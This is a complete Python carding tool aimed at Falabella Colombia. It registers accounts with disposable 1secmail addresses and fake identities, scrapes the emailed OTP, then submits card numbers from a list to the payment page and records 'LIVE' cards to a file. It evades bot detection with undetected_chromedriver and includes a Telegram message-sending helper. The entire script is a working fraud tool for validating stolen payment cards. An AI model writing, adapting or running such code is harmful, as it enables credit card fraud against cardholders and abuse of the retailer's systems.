import os
import sys
import hashlib
import uuid
import getpass
import socket
import requests
import time
import random
import string
import re
import base64
import subprocess
import winreg
import platform
from faker import Faker
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
from colorama import Fore, Style, init
from selenium.common.exceptions import TimeoutException
from datetime import datetime

init(autoreset=True)

# =========== CONFIGURACIÓN DE PATHS UNIVERSALES ===========
if getattr(sys, 'frozen', False):  # Si está en EXE compilado
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

NEEDED_FILES = ["tarjetas.txt", "homcorreo.txt", "lives.txt"]


# =========== VERIFICAR/INSTALAR DEPENDENCIAS ===========
REQUIREMENTS = ["requests", "faker", "selenium", "undetected-chromedriver", "colorama", "pywin32"]
if not getattr(sys, 'frozen', False):  # Solo si es .py, no en .exe
    import importlib
    for pkg in REQUIREMENTS:
        try:
            importlib.import_module(pkg.replace("-", "_"))
        except ImportError:
            with open(os.devnull, 'w') as DEVNULL:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pkg],
                    stdout=DEVNULL, stderr=DEVNULL
                )

# =========== CREAR ARCHIVOS NECESARIOS SI NO EXISTEN ===========
for fname in NEEDED_FILES:
    path = os.path.join(BASE_DIR, fname)
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            pass

file_path = os.path.join(BASE_DIR, "tarjetas.txt")

# =========== PRINT INLINE ROBUSTO ===========
def print_inline(msg, ancho=80, duracion=None, paso=0.3):
    puntos = ['', '.', '..', '...', '....', '.....']
    if duracion is None:
        print('\r' + str(msg).ljust(ancho), end='', flush=True)
        return
    t_final = time.time() + duracion
    i = 0
    while time.time() < t_final:
        loading = msg + puntos[i % len(puntos)]
        print('\r' + str(loading).ljust(ancho), end='', flush=True)
        time.sleep(paso)
        i += 1
    print('\r' + ' ' * ancho, end='\r', flush=True)

################### ADDY.IO ###################

import requests, time, random, string, re

# ========= reemplazo de crear_cuenta_mailtm() =========
def crear_cuenta_mailtm():
    login = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['1secmail.com', '1secmail.net', '1secmail.org'])
    email = f"{login}@{domain}"
    print(f"🆕 Correo temporal creado: {email}")
    return email, login, domain

# ========= reemplazo de obtener_token_mailtm() =========
# En 1secmail no se necesita token, así que solo reenviamos los datos
def obtener_token_mailtm(email, login):
    return {"email": email, "login": login.split("@")[0], "domain": email.split("@")[1]}

# ========= reemplazo de esperar_codigo_mailtm() =========
def esperar_codigo_mailtm(token, timeout=120):
    login = token["login"]
    domain = token["domain"]
    start = time.time()
    while time.time() - start < timeout:
        try:
            url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}"
            mensajes = requests.get(url, timeout=10).json()
            for msg in mensajes:
                msg_id = msg["id"]
                r = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={msg_id}", timeout=10).json()
                texto = r.get('textBody') or r.get('body') or ''
                match = re.search(r'\b\d{4,6}\b', texto)
                if match:
                    print(f"✅ OTP encontrado: {match.group(0)}")
                    return match.group(0)
        except Exception:
            pass
        print("⏳ Esperando correo OTP... (1SecMail)")
        time.sleep(4)
    print("❌ No llegó el correo de verificación.")
    return None

# ========= sin cambios =========
def generar_correo_mailtm():
    email, login, domain = crear_cuenta_mailtm()
    if not email: return None, None, None
    token = obtener_token_mailtm(email, login)
    if not token: return None, None, None
    return email, login, token

# ========= sin cambios =========
def obtener_codigo_mailtm(token):
    return esperar_codigo_mailtm(token, timeout=90)


###################################################

def print_banner():
    print(Fore.GREEN + Style.BRIGHT)
    print("███████╗░█████╗░██╗░░░░░░█████╗░██████╗░███████╗██╗░░░░░██╗░░░░░░█████╗░")
    print("██╔════╝██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝██║░░░░░██║░░░░░██╔══██╗")
    print("█████╗░░███████║██║░░░░░███████║██████╦╝█████╗░░██║░░░░░██║░░░░░███████║")
    print("██╔══╝░░██╔══██║██║░░░░░██╔══██║██╔══██╗██╔══╝░░██║░░░░░██║░░░░░██╔══██║")
    print("██║░░░░░██║░░██║███████╗██║░░██║██████╦╝███████╗███████╗███████╗██║░░██║")
    print("╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝")
    print(Style.RESET_ALL + Fore.LIGHTMAGENTA_EX + "                      by Jeronimocks\n" + Style.RESET_ALL)



def send_telegram_message(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        print_inline(f"⚠️ Error enviando mensaje a Telegram: {e}", duracion=2)

def remove_card_from_file(card_number, expiry_month, expiry_year, cvv):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip() != f"{card_number}|{expiry_month}|{expiry_year}|{cvv}":
                file.write(line)

def scroll_to_element(driver, element):
    driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", element)
    time.sleep(0.3)

def wait_and_scroll(driver, by, value, timeout=12):
    elem = WebDriverWait(driver, timeout).until(EC.presence_of_element_located((by, value)))
    scroll_to_element(driver, elem)
    return elem

def generar_datos(email):
    fake = Faker('es_ES')
    nombre = fake.first_name()
    apellidos = fake.last_name()
    password = (
        ''.join(random.choices(string.ascii_lowercase, k=5)) +
        ''.join(random.choices(string.ascii_uppercase, k=1)) +
        ''.join(random.choices(string.digits, k=1)) +
        ''.join(random.choices(string.ascii_letters + string.digits, k=2))
    )
    celular = "3" + random.choice(["10", "12", "20"]) + ''.join(random.choices(string.digits, k=7))
    cedula = "153" + ''.join(random.choices(string.digits, k=7))
    return {
        'nombre': nombre,
        'apellidos': apellidos,
        'email': email,
        'password': password,
        'celular': celular,
        'cedula': cedula
    }

def guardar_cuenta(email, password):
    with open("homcorreo.txt", "a") as file:
        file.write(f"{email} - FALABELLA : {password}\n")

def create_driver():
    options = uc.ChromeOptions()
    options.add_argument("--disable-features=ChromeBrowserCloudManagement")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-extensions")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-plugins-discovery")
    options.add_argument("--disable-plugins")
    options.add_argument('--log-level=3')
    options.add_argument("--disable-cache")
    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)
    driver = uc.Chrome(options=options)
    return driver

#######################   AGREGAR TUS FUNCIONES DE FALABELLA   #######################
def safe_click(driver, element, intentos=4):
    for i in range(intentos):
        try:
            # Scroll arriba para despejar el checkbox del footer
            driver.execute_script(
                "arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", element
            )
            driver.execute_script("window.scrollBy(0, -150);")
            time.sleep(0.4)
            element.click()
            return True
        except Exception:
            time.sleep(0.3)
    return False

def guardar_live(msg, archivo="lives.txt"):
    with open(archivo, "a", encoding="utf-8") as f:
        f.write(msg + "\n")
        
        
def rellenar_formulario_falabella(driver, datos, intento=1):
    try:
        campos = [
            ('name', 'email', datos['email'], '✉️ Email'),
            ('name', 'firstName', datos['nombre'], '🧑 Nombre'),
            ('name', 'lastName', datos['apellidos'], '🧑‍🦱 Apellidos'),
            ('name', 'document', datos['cedula'], '🆔 Documento'),
            ('name', 'documentIdValidator', datos['cedula'], '🔁 Confirmar Doc.'),
            ('name', 'phoneNumber', datos['celular'], '📱 Celular'),
            ('name', 'password', datos['password'], '🔒 Contraseña'),
        ]
        for by_type, value, texto, emoji in campos:
            print_inline(f"{emoji} Rellenando...", duracion=0.7)
            campo = wait_and_scroll(driver, getattr(By, by_type.upper()), value)
            campo.clear()
            campo.send_keys(texto)
            time.sleep(0.4)
            if campo.get_attribute("value") != texto:
                campo.clear()
                campo.send_keys(texto)
                time.sleep(0.3)
                if campo.get_attribute("value") != texto and intento == 1:
                    print_inline("❌ No se pudo llenar un campo, reiniciando proceso...", duracion=2)
                    return False

        # --- ELIMINA FOOTER FLOTANTE si existe ---
        try:
            driver.execute_script("""
                let footer = document.querySelector('section.Footer-module_footer-bottom__1PSUN');
                if (footer) footer.remove();
            """)
        except Exception:
            pass

        checkboxes = driver.find_elements(By.CSS_SELECTOR, "span.chakra-checkbox__control")
        if len(checkboxes) >= 2:
            for cb in checkboxes[:2]:
                if not safe_click(driver, cb, intentos=5):
                    print_inline("❌ Falló el click en checkbox, saltando registro.", duracion=2)
                    return False
                time.sleep(0.3)
        else:
            print_inline("❌ No encontró ambos checkboxes, reiniciando proceso...", duracion=2)
            return False

        print_inline("🚀 Esperando botón habilitado...", duracion=0.7)
        for _ in range(12):
            boton = driver.find_element(By.XPATH, '//button[contains(text(), "Regístrate")]')
            scroll_to_element(driver, boton)
            if boton.is_enabled():
                boton.click()
                break
            time.sleep(0.4)
        else:
            print_inline("❌ Botón 'Regístrate' sigue deshabilitado, reiniciando proceso...", duracion=2)
            return False

        print_inline("🎉 Registro enviado, esperando validación OTP...", duracion=2)
        WebDriverWait(driver, 14).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, ".chakra-modal__content"))
        )
        return True

    except Exception as e:
        print_inline("❌ ERROR en el registro, reintentando...", duracion=2)
        # No ensucia la consola con stacktrace, solo muestra el mensaje
        if intento == 1:
            return False
        else:
            raise e

def validar_otp(driver, codigo):
    wait = WebDriverWait(driver, 15)
    print_inline(f"🔢 Ingresando OTP {codigo}...", duracion=1.2)
    try:
        inputs = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input.chakra-pin-input")))
        for i, char in enumerate(str(codigo)):
            inputs[i].send_keys(char)
            time.sleep(0.18)
        validar_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Validar y crear cuenta')]")))
        scroll_to_element(driver, validar_btn)
        validar_btn.click()
        print_inline("🔓 Esperando confirmación...", duracion=2)

        url_exito = "https://www.falabella.com.co/falabella-co/myaccount/success"
        for _ in range(18):
            time.sleep(1)
            if driver.current_url == url_exito:
                print_inline("✅ Cuenta creada y verificada correctamente.", duracion=2)
                return True
            if not driver.find_elements(By.CSS_SELECTOR, ".chakra-modal__content"):
                print_inline("✅ Cuenta creada y verificada correctamente (modal cerrado).", duracion=2)
                return True
            error_msgs = driver.find_elements(
                By.XPATH, "//*[contains(text(), 'inválido') or contains(text(), 'incorrecto') or contains(text(), 'Código no válido')]"
            )
            if error_msgs:
                print_inline("❌ Código OTP inválido o registro no confirmado.", duracion=2)
                return False
        print_inline("❌ Tiempo agotado esperando confirmación OTP.", duracion=2)
        return False
    except Exception as e:
        print_inline(f"❌ Error inesperado validando OTP: {e}", duracion=2)
        return False
    
def testear_creditcards(driver, file_path):
    try:
        with open(file_path, 'r') as file:
            tarjetas = file.readlines()
        if not tarjetas:
            print_inline("🚫 No hay más tarjetas para probar.", duracion=2)
            return False

        tarjetas_procesadas = 0
        while tarjetas_procesadas < 2 and tarjetas:
            tarjeta = tarjetas.pop(0).strip()
            if not tarjeta:
                continue

            try:
                num, mes, anio, cvv = tarjeta.split('|')
            except Exception:
                print_inline(f"❌ Formato inválido: {tarjeta}", duracion=2)
                continue

            mes_anio = mes + anio[-2:]

            print_inline("🌐 Abriendo métodos de pago Falabella...", duracion=1.2)
            driver.get("https://www.falabella.com.co/falabella-co/myaccount/myPayments")

            print_inline("🟢 Preparando formulario...", duracion=1.2)
            try:
                button_xpath = "/html/body/div/div/section/div/div[2]/div[6]/div[2]/button"
                button = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, button_xpath))
                )
                driver.execute_script("arguments[0].scrollIntoView(true);", button)
                button.click()
            except Exception as e:
                print_inline(f"❌ No se encontró el botón de agregar tarjeta: {e}", duracion=2)
                continue

            print_inline("🔒 Rellenando datos de tarjeta...", duracion=1.3)
            try:
                iframe = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '/html/body/div[4]/div/div[3]/iframe'))
                )
                driver.switch_to.frame(iframe)
                time.sleep(1)

                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/form/div[1]/div/div/span/input'))
                ).send_keys(num)
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/form/div[2]/div[1]/div/input'))
                ).send_keys(mes_anio)
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/form/div[2]/div[2]/div/input'))
                ).send_keys(cvv)
                WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div/div/form/div[4]/div/button'))
                ).click()
            except Exception as e:
                print_inline(f"❌ Error llenando datos: {e}", duracion=2)
                driver.switch_to.default_content()
                continue

            print_inline("⏳ Esperando respuesta del sistema...", duracion=2)
            try:
                WebDriverWait(driver, 30).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".swal2-success, .swal2-error"))
                )

                # DEAD
                try:
                    error_message = driver.find_element(By.CSS_SELECTOR, ".swal2-error")
                    if error_message.is_displayed():
                        dead_message = f"[💀 DEAD] {num}|{mes}|{anio}|{cvv}"
                        print(Fore.RED + dead_message + Fore.RESET)
                        remove_card_from_file(num, mes, anio, cvv)
                        tarjetas_procesadas += 1
                        driver.switch_to.default_content()
                        continue
                except Exception:
                    pass

                # LIVE
                try:
                    success_message = driver.find_element(By.CSS_SELECTOR, ".swal2-success")
                    if success_message.is_displayed():
                        
                        live_msg = f"[✅ LIVE] {num}|{mes}|{anio}|{cvv}"
                        print(Fore.GREEN + live_msg + Fore.RESET)
                        guardar_live(live_msg)
                        remove_card_from_file(num, mes, anio, cvv)
                        driver.switch_to.default_content()
                        return "LIVE"   # <--- IMPORTANTE: DEVUELVE "LIVE"
                except Exception:
                    pass

            except Exception as e:
                print_inline(f"⚠️ Error esperando resultado: {e}", duracion=2)
                driver.switch_to.default_content()
                continue

        # Actualizar archivo con tarjetas restantes (por seguridad)
        with open(file_path, 'w') as file:
            file.writelines(tarjetas)
        return True

    except Exception as e:
        print_inline(f"Error durante la prueba de tarjetas: {e}", duracion=2)
        return False


def main():
    print_banner()
    while True:
        try:
            # 1. Generar correo temporal con Mail.tm (API)
            correo, mailtm_pass, mailtm_token = generar_correo_mailtm()
            if not correo:
                print_inline("❌ No se pudo generar correo temporal.", duracion=2)
                driver.quit()
                continue

            # 2. Registro Falabella (todo en la única pestaña)
            driver = create_driver()
            print_inline("🌐 Abriendo página de registro de Falabella...", duracion=1.3)
            driver.get("https://www.falabella.com.co/falabella-co/myaccount/registration")
            time.sleep(3)
            datos = generar_datos(correo)
            exito = rellenar_formulario_falabella(driver, datos, intento=1)
            if not exito:
                print_inline("🔁 Reintentando registro con los mismos datos...", duracion=2)
                driver.refresh()
                time.sleep(3)
                exito = rellenar_formulario_falabella(driver, datos, intento=2)
            if exito:
                print_inline("🔎 Esperando código OTP en Mail.tm...", duracion=2)
                codigo = obtener_codigo_mailtm(mailtm_token)
                if codigo:
                    otp_ok = validar_otp(driver, codigo)
                    if otp_ok:
                        guardar_cuenta(correo, datos['password'])
                        print_inline("🟢 Iniciando test de tarjetas...", duracion=1.5)
                        resultado = testear_creditcards(driver, file_path)
                        if resultado == "LIVE":
                            print_inline("✅ LIVE detectado, reiniciando ciclo con nueva cuenta...", duracion=2)
                            continue  # Reinicia todo, nuevo correo y nueva cuenta
                else:
                    print_inline("❌ No se pudo obtener código OTP.", duracion=2)
            else:
                print_inline("❌ No se pudo crear la cuenta tras 2 intentos. Saltando.", duracion=2)
        except Exception as e:
            print_inline(f"❌ ERROR durante el proceso: {e}", duracion=3)
        finally:
            driver.quit()
        # Sale solo si ya no hay tarjetas (o error al leerlas)
        try:
            with open(file_path, 'r') as file:
                if not file.readlines():
                    print(Fore.YELLOW + "🚫 No hay más tarjetas para probar. Proceso finalizado." + Fore.RESET)
                    break
        except Exception as e:
            print(Fore.RED + f"❌ Error revisando archivo de tarjetas: {e}" + Fore.RESET)
            break

if __name__ == "__main__":
    main()
